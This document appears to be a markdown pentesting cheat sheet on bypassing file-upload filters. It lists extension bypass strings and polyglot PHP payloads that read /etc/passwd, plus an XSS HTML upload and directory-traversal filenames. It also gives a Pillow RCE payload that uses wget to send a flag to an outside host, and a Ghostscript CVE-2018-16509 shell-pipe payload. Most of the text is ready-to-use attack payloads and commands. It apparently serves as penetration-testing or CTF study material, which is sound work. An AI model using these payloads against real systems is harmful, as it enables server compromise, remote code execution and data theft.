# Basic
### direct access
- We can upload a `html` or `php` file, and run it. (shell upload and exploit)
  ```html
  <img src="https://cvefix.ir/images/profile.png">     # Static resource 
  ```
### indirect access (tokenized)
- We are not able to upload shell and exploit.
  ```html
  <img src="https://cvefix.ir/api/v1/get_image/44">    # Function
  ```

# Bypass
- Check three part in upload request to understand checker function
  - Extension Check (file type)
  - Content-type header Check
  - Content Check (Polygot)
  
### Extension check
- Fuzz for extensions (`sample.php§§.png`) to check which one is not blocked.
- Check these payloads, if the extension of uploaded file is `png`  →  USELESS PAYLOAD
  ```bash
  # Alternative extensions
  .phar
  .phtml

  # Double extension
  .php.png
  .png.php

  # Extension with delimiter
  .php%00.png
  .png%00.php
  .php#.jpg
  .php%0a.png

  # Adding extra dots
  .php.
  .jsp...................
  ```

### Content check
- Adding image magic bytes to start of uploaded file.
  ```html
  -----------------------------227218775938856708732970334425
  Content-Disposition: form-data; name="file"; filename="1.htm"
  Content-Type: image/png

  ‰PNG
  

  <html><script>alert(origin)</script></html>
  ```
- Add codes to end of an image file
  ```bash
  echo "<?php echo system('id'); >" >> small.png         # Add code at end of a `png` file.
  mv small.png small.php                                 # if there is no extension check
  ```
- Use polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.
  ```bash
  exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" a.jpg -o polyglot.php
  ```

### `Content-Type` Header check
- Change the file extension (`html` → `jpg`), then upload the file and intercept the request in BurpSuite, finally modify file extension in Burp (`1.jpg` → `1.html`) and send the request.
- Change Content-type:
  - `Content-Type: application/octet-stream`  →  `Content-Type: image/jpeg`

# Exploit
- Uploading certain types of file (`.php`, `.jsp`, ...) to be executed as code.
  ```php
  <?php echo file_get_contents('/etc/passwd'); ?>
  ```
  ```bash
  exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" a.jpg -o polyglot.php
  ```
- Uploading static files (`.html`, `.svg`, ...) that is used for XSS (origin of request will be the origin of victim).
  ```html
  -----------------------------227218775938856708732970334425
  Content-Disposition: form-data; name="profile_image"; filename="profile_image.html"         # We upload a .jpg then change the extension here
  Content-Type: image/jpeg                                                                    # We bypass content-type header check by .html → .jpeg

  ‰PNG
  

  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PoC</title>
  </head>
  <body>
    <script type="text/javascript">alert(origin)</script>
  </body>
  </html>
  ```
- Uploading Large files, results in DoS attack by filling the available disk space.
- Directory traversal
  - Upload files to unanticipated locations.
    ```bash
    file=../../../../../../etc/hosts
    ```
  - Put payload in an executable directory.
    - Change `Content-Disposition:` in request body by adding `..%2f`. (We should use URL-encode)
    - After uploading payload, should change url path to access correct direcotry of uploaded payload.
    ```html
    -----------------------------1349499273377714020420439545
    Content-Disposition: form-data; name="avatar"; filename="..%2fa.php"
    Content-Type: application/octet-stream

    <?php echo file_get_contents('/etc/passwd'); ?>
    ```
- RCE with vulnerability in a python library to process images (`Pillow==8.4.0`)
  ```bash
  POST /api/alphafy HTTP/1.1
  (Request Body)
  {
    "image":"iVB....TkSuQmCC",
    "background":["
      exec('import os;os.system(\"flag=$(cat ../flag.txt);wget http://cvefix.ir:8080?flag=${flag}\")')",
      0,
      0
    ]
  }
  ```
  - Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509.
    - _https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509_
    - Save his file as `1.jpg`.
    ```bash
    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: -0 -0 100 100
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
    ```

  # Resource
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  - https://book.hacktricks.xyz/pentesting-web/file-upload
